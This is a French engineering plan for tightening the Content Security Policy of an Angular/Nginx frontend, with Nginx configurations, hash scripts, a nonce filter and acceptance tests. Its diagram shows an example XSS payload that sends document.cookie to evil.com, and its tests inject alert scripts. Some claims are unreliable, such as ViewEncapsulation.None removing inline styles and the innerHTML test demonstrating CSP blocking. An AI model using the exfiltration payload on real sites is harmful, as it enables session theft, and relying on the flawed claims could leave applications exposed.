# Step 1.3 : Renforcement de la Content Security Policy (CSP)

## Contexte

La Content Security Policy actuelle du frontend utilise `'unsafe-inline'` pour les scripts et styles, ce qui affaiblit significativement la protection contre les attaques XSS. Angular génère des styles inline lors du rendu, ce qui nécessite une configuration CSP adaptée.

### État actuel

**nginx.conf :**
```nginx
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'unsafe-inline';      # ⚠️ DANGEREUX
    style-src 'self' 'unsafe-inline';       # ⚠️ DANGEREUX
    img-src 'self' data:;
    font-src 'self' data: https://fonts.gstatic.com;
    connect-src 'self' https://api.serenia.studio;
    object-src 'none';
    frame-ancestors 'self';
    base-uri 'self';
    form-action 'self'
" always;
```

### Pourquoi `'unsafe-inline'` est problématique

| Directive | Avec `'unsafe-inline'` | Risque |
|-----------|----------------------|--------|
| `script-src` | Exécute TOUT script inline | XSS trivial via injection `<script>` |
| `style-src` | Applique TOUT style inline | Exfiltration de données via CSS |

### Fichiers concernés

| Fichier | Modification |
|---------|--------------|
| `frontend/nginx.conf` | Nouvelle CSP |
| `frontend/angular.json` | Configuration build |
| `frontend/src/index.html` | Possiblement nonce/hash |

---

## Objectif

1. **Supprimer `'unsafe-inline'`** de `script-src` et `style-src`
2. **Utiliser des hashes SHA-256** ou **nonces** pour les scripts/styles légitimes
3. **Configurer Angular** pour la compatibilité CSP
4. **Ajouter des directives de sécurité supplémentaires** (`upgrade-insecure-requests`, `report-uri`)
5. **Tester que l'application fonctionne** sans erreurs CSP

---

## Méthode

### 1.3.1 Comprendre les Options CSP

| Méthode | Description | Avantages | Inconvénients |
|---------|-------------|-----------|---------------|
| `'nonce-xxx'` | Token unique par requête | Très sécurisé | Nécessite SSR ou modification serveur |
| `'sha256-xxx'` | Hash du contenu | Statique, compatible CDN | Doit être recalculé à chaque build |
| `'strict-dynamic'` | Trust propagé | Simplifie la config | Support navigateur variable |
| `'unsafe-inline'` | Autoriser tout | Simple | ❌ INSÉCURISÉ |

**Pour Angular SPA avec Nginx (pas de SSR)** : La méthode **hash** est recommandée.

### 1.3.2 Identifier les Scripts/Styles Inline

#### Étape 1 : Builder l'application et analyser

```bash
cd frontend
npm run build

# Lister les fichiers générés
ls -la dist/frontend/browser/

# Rechercher les scripts inline dans index.html
cat dist/frontend/browser/index.html
```

**index.html typique Angular (après build) :**
```html
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Serenia</title>
  <base href="/">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="favicon.ico">
  <!-- Styles externes - OK pour CSP -->
  <link rel="stylesheet" href="styles.abc123.css">
</head>
<body>
  <app-root></app-root>
  <!-- Scripts externes - OK pour CSP -->
  <script src="main.xyz789.js" type="module"></script>
</body>
</html>
```

**Bonne nouvelle** : Angular moderne (Ivy) génère des **fichiers externes**, pas de scripts inline dans index.html par défaut.

### 1.3.3 Configurer Angular pour la Compatibilité CSP

#### Option A : Désactiver les styles inline Angular (recommandé)

Angular peut injecter des styles inline pour l'encapsulation des composants. Pour désactiver :

**Dans chaque composant :**
```typescript
@Component({
  selector: 'app-example',
  templateUrl: './example.component.html',
  styleUrls: ['./example.component.css'],
  encapsulation: ViewEncapsulation.None  // Pas de styles inline
})
```

**Ou globalement dans angular.json :**
```json
{
  "projects": {
    "frontend": {
      "architect": {
        "build": {
          "options": {
            "inlineStyleLanguage": "css",
            "styles": ["src/styles.css"],
            "extractLicenses": true,
            "optimization": true
          }
        }
      }
    }
  }
}
```

#### Option B : Utiliser des hashes pour les styles critiques

Si certains styles inline sont nécessaires (ex: styles critiques de chargement) :

1. **Calculer le hash après le build :**

```bash
#!/bin/bash
# calculate_csp_hashes.sh

INDEX_FILE="dist/frontend/browser/index.html"

# Extraire les contenus des balises <style>
grep -oP '(?<=<style>).*(?=</style>)' "$INDEX_FILE" | while read -r style; do
    HASH=$(echo -n "$style" | openssl dgst -sha256 -binary | base64)
    echo "style-src hash: 'sha256-$HASH'"
done

# Extraire les contenus des balises <script> inline (si présentes)
grep -oP '(?<=<script>).*(?=</script>)' "$INDEX_FILE" | while read -r script; do
    HASH=$(echo -n "$script" | openssl dgst -sha256 -binary | base64)
    echo "script-src hash: 'sha256-$HASH'"
done
```

2. **Intégrer dans le pipeline CI/CD** pour générer automatiquement les hashes.

### 1.3.4 Nouvelle Configuration CSP

**nginx.conf - Version sécurisée :**

```nginx
server {
    listen 80;
    server_name _;
    root /usr/share/nginx/html;
    index index.html;
    server_tokens off;

    # Compression
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
    gzip_min_length 1024;
    gzip_vary on;

    # SPA routing
    location / {
        try_files $uri $uri/ /index.html;
        expires -1;

        # Cache Control
        add_header Cache-Control "no-cache, no-store, must-revalidate" always;

        # Security Headers
        add_header X-Frame-Options "SAMEORIGIN" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Permissions-Policy "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()" always;

        # Content Security Policy - VERSION STRICTE
        add_header Content-Security-Policy "
            default-src 'self';
            script-src 'self';
            style-src 'self' https://fonts.googleapis.com;
            img-src 'self' data: https:;
            font-src 'self' data: https://fonts.gstatic.com;
            connect-src 'self' https://api.serenia.studio wss://api.serenia.studio;
            object-src 'none';
            frame-src 'none';
            frame-ancestors 'self';
            base-uri 'self';
            form-action 'self';
            upgrade-insecure-requests;
            block-all-mixed-content;
        " always;
    }

    # Assets cache (JS, CSS, Images, Fonts)
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
        add_header X-Content-Type-Options "nosniff" always;
    }

    # Health check endpoint
    location /health {
        return 200 "healthy\n";
        add_header Content-Type text/plain;
        access_log off;
    }
}
```

### 1.3.5 Alternative avec Nonces (si SSR ou proxy dynamique)

Si vous utilisez un backend qui peut modifier les réponses HTML :

**Backend/Proxy génère un nonce par requête :**

```java
// Filtre qui ajoute un nonce
@Provider
public class CspNonceFilter implements ContainerResponseFilter {
    
    @Override
    public void filter(ContainerRequestContext req, ContainerResponseContext resp) {
        String nonce = Base64.getEncoder().encodeToString(
            SecureRandom.getInstanceStrong().generateSeed(16)
        );
        
        String csp = String.format(
            "script-src 'self' 'nonce-%s'; style-src 'self' 'nonce-%s'",
            nonce, nonce
        );
        
        resp.getHeaders().add("Content-Security-Policy", csp);
        req.setProperty("csp-nonce", nonce);  // Pour injection dans HTML
    }
}
```

### 1.3.6 Configuration CSP Report-Only (Phase de Test)

Avant de déployer en production, tester avec `Content-Security-Policy-Report-Only` :

```nginx
# Phase de test - ne bloque pas, reporte seulement
add_header Content-Security-Policy-Report-Only "
    default-src 'self';
    script-src 'self';
    style-src 'self' https://fonts.googleapis.com;
    report-uri https://api.serenia.studio/csp-report;
    report-to csp-endpoint;
" always;

# Header Report-To pour les nouveaux navigateurs
add_header Report-To '{"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"https://api.serenia.studio/csp-report"}]}' always;
```

**Backend - Endpoint de reporting :**

```java
@Path("/csp-report")
@POST
@Consumes(MediaType.APPLICATION_JSON)
public Response receiveCspReport(String report) {
    log.warn("CSP Violation: {}", report);
    // Stocker en BDD ou envoyer vers monitoring
    return Response.noContent().build();
}
```

### 1.3.7 Gérer les Polices Google Fonts

Si vous utilisez Google Fonts, la CSP doit autoriser :

```nginx
style-src 'self' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
```

**Alternative plus sécurisée : Self-hosting des fonts**

```bash
# Télécharger les fonts localement
mkdir -p src/assets/fonts
# Copier les fichiers .woff2 depuis Google Fonts
# Mettre à jour styles.css avec @font-face local
```

```css
/* styles.css */
@font-face {
    font-family: 'Roboto';
    src: url('/assets/fonts/roboto-regular.woff2') format('woff2');
    font-weight: 400;
    font-display: swap;
}
```

---

## Architecture

### Diagramme de Protection CSP

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         CSP PROTECTION FLOW                              │
└─────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  SANS CSP (ou avec 'unsafe-inline')                                      │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  1. Attaquant injecte: <script>fetch('https://evil.com?c='+        │ │
│  │                        document.cookie)</script>                   │ │
│  │                                                                    │ │
│  │  2. Navigateur exécute le script inline                           │ │
│  │                                                                    │ │
│  │  3. Cookies/données envoyés à l'attaquant                         │ │
│  │                               ❌ XSS RÉUSSI                       │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  AVEC CSP STRICTE (script-src 'self')                                    │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │  1. Attaquant injecte: <script>fetch('https://evil.com?c='+        │ │
│  │                        document.cookie)</script>                   │ │
│  │                                                                    │ │
│  │  2. Navigateur vérifie la CSP:                                    │ │
│  │     - script-src 'self' → scripts de serenia.studio UNIQUEMENT    │ │
│  │     - Script inline? → BLOQUÉ                                     │ │
│  │                                                                    │ │
│  │  3. Console: "Refused to execute inline script because it         │ │
│  │              violates the Content Security Policy"                │ │
│  │                               ✅ XSS BLOQUÉ                       │ │
│  └────────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────────┘
```

### Matrice des Directives CSP

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         CSP DIRECTIVES MATRIX                            │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────┬────────────────────────────────────────────────────────┐
│   DIRECTIVE     │   SOURCES AUTORISÉES                                   │
├─────────────────┼────────────────────────────────────────────────────────┤
│ default-src     │ 'self'                                                 │
│                 │ Fallback pour toutes les directives non spécifiées     │
├─────────────────┼────────────────────────────────────────────────────────┤
│ script-src      │ 'self'                                                 │
│                 │ Scripts depuis serenia.studio uniquement               │
│                 │ ❌ Pas de inline, pas d'eval                           │
├─────────────────┼────────────────────────────────────────────────────────┤
│ style-src       │ 'self' https://fonts.googleapis.com                    │
│                 │ Styles locaux + Google Fonts CSS                       │
├─────────────────┼────────────────────────────────────────────────────────┤
│ img-src         │ 'self' data: https:                                    │
│                 │ Images locales + data URIs + HTTPS externes            │
├─────────────────┼────────────────────────────────────────────────────────┤
│ font-src        │ 'self' data: https://fonts.gstatic.com                 │
│                 │ Polices locales + data URIs + Google Fonts             │
├─────────────────┼────────────────────────────────────────────────────────┤
│ connect-src     │ 'self' https://api.serenia.studio                      │
│                 │ XHR/Fetch vers API uniquement                          │
├─────────────────┼────────────────────────────────────────────────────────┤
│ object-src      │ 'none'                                                 │
│                 │ Pas de plugins (Flash, Java)                           │
├─────────────────┼────────────────────────────────────────────────────────┤
│ frame-src       │ 'none'                                                 │
│                 │ Pas d'iframes autorisées                               │
├─────────────────┼────────────────────────────────────────────────────────┤
│ frame-ancestors │ 'self'                                                 │
│                 │ L'app peut être dans une iframe du même domaine        │
├─────────────────┼────────────────────────────────────────────────────────┤
│ base-uri        │ 'self'                                                 │
│                 │ <base> tag limité au même domaine                      │
├─────────────────┼────────────────────────────────────────────────────────┤
│ form-action     │ 'self'                                                 │
│                 │ Formulaires soumis au même domaine uniquement          │
└─────────────────┴────────────────────────────────────────────────────────┘
```

---

## Tests d'Acceptance

### TA-1.3.1 : CSP Header Présent et Correct

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Header présent | `curl -I https://serenia.studio` | Header `Content-Security-Policy` présent |
| 2 | Pas de unsafe-inline | Inspecter la CSP | Ne contient PAS `'unsafe-inline'` |
| 3 | Directives clés | Inspecter la CSP | Contient `default-src`, `script-src`, `style-src` |

**Script de test :**

```bash
#!/bin/bash
# test_csp_headers.sh

URL="https://serenia.studio"

echo "=== Test CSP Headers ==="

CSP=$(curl -s -I "$URL" | grep -i "content-security-policy" | head -1)

echo "CSP Header: $CSP"
echo ""

# Vérifications
if echo "$CSP" | grep -qi "unsafe-inline"; then
    echo "❌ ÉCHEC: 'unsafe-inline' présent dans la CSP"
    exit 1
else
    echo "✅ Pas de 'unsafe-inline'"
fi

if echo "$CSP" | grep -qi "script-src"; then
    echo "✅ script-src présent"
else
    echo "❌ script-src manquant"
fi

if echo "$CSP" | grep -qi "style-src"; then
    echo "✅ style-src présent"
else
    echo "❌ style-src manquant"
fi

if echo "$CSP" | grep -qi "upgrade-insecure-requests"; then
    echo "✅ upgrade-insecure-requests présent"
else
    echo "⚠️ upgrade-insecure-requests manquant (recommandé)"
fi
```

### TA-1.3.2 : Scripts Inline Bloqués

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Injection script | Injecter `<script>alert('xss')</script>` via input | Script NON exécuté |
| 2 | Console erreur | Ouvrir DevTools Console | Message "Refused to execute inline script" |
| 3 | App fonctionne | Navigation normale | Aucune erreur CSP pour l'app elle-même |

**Test manuel :**

1. Ouvrir https://serenia.studio
2. Ouvrir DevTools (F12) > Console
3. Naviguer dans l'application
4. Vérifier qu'il n'y a PAS d'erreurs CSP

**Test d'injection (si possible via un champ) :**
```javascript
// Dans la console du navigateur, simuler une injection
document.body.innerHTML += '<script>alert("XSS")</script>';
// Résultat attendu: erreur CSP dans la console, pas d'alert
```

### TA-1.3.3 : Styles Inline Bloqués

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Style inline | Élément avec `style="..."` injecté | Style NON appliqué |
| 2 | App stylée | Vérifier le rendu de l'app | Styles CSS chargés correctement |

**Test :**
```javascript
// Console navigateur
document.body.innerHTML += '<div style="background:red;width:100px;height:100px">TEST</div>';
// Résultat attendu: div ajouté mais style non appliqué (ou erreur CSP)
```

### TA-1.3.4 : Application Fonctionne Sans Erreurs CSP

| # | Page/Fonctionnalité | Vérification | Résultat |
|---|---------------------|--------------|----------|
| 1 | Page de login | Affichage correct | ✅ / ❌ |
| 2 | Dashboard | Affichage correct | ✅ / ❌ |
| 3 | Chat | Envoi/réception messages | ✅ / ❌ |
| 4 | Profil | Affichage et édition | ✅ / ❌ |
| 5 | Styles CSS | Tous les styles appliqués | ✅ / ❌ |
| 6 | Fonts | Polices chargées | ✅ / ❌ |
| 7 | Images | Toutes les images visibles | ✅ / ❌ |

**Checklist de test manuel :**

```
□ Ouvrir https://serenia.studio
□ F12 > Console (vérifier pas d'erreurs CSP en rouge)
□ Se connecter
□ Envoyer un message dans le chat
□ Aller sur le profil
□ Vérifier le footer/header (styles)
□ Vérifier les icônes/images
□ Fermer DevTools, naviguer normalement
```

### TA-1.3.5 : CSP Reporting Fonctionnel (si configuré)

| # | Scénario | Action | Résultat Attendu |
|---|----------|--------|------------------|
| 1 | Violation générée | Injecter script inline | Rapport envoyé à `/csp-report` |
| 2 | Log backend | Vérifier logs | Violation loggée |

---

## Dépannage

### Problème : Erreurs CSP au chargement de l'app

**Symptôme :** Messages "Refused to execute..." dans la console

**Solutions :**

1. **Identifier la source du script/style inline :**
   ```bash
   # Rechercher les styles inline dans le HTML généré
   grep -n "style=" dist/frontend/browser/index.html
   ```

2. **Ajouter un hash si nécessaire :**
   ```bash
   # Calculer le hash
   CONTENT="le contenu du style inline"
   echo -n "$CONTENT" | openssl dgst -sha256 -binary | base64
   # Ajouter 'sha256-HASH' à style-src
   ```

3. **Vérifier les dépendances tierces :**
   - Certaines libs Angular injectent des styles inline
   - Mettre à jour ou remplacer la lib

### Problème : Google Fonts ne charge pas

**Solution :** Vérifier que `style-src` et `font-src` incluent les domaines Google :
```nginx
style-src 'self' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
```

### Problème : API calls bloqués

**Solution :** Vérifier `connect-src` :
```nginx
connect-src 'self' https://api.serenia.studio;
```

---

## Critères de Complétion

- [ ] CSP sans `'unsafe-inline'` déployée
- [ ] Angular configuré pour éviter les styles inline (si applicable)
- [ ] Hashes calculés pour tout contenu inline nécessaire (si applicable)
- [ ] Google Fonts autorisé ou self-hosted
- [ ] Directive `upgrade-insecure-requests` ajoutée
- [ ] Tests TA-1.3.1 à TA-1.3.4 passent
- [ ] Application fonctionnelle sans erreurs CSP dans la console
- [ ] (Optionnel) CSP Reporting configuré et testé
- [ ] Documentation mise à jour avec la nouvelle CSP
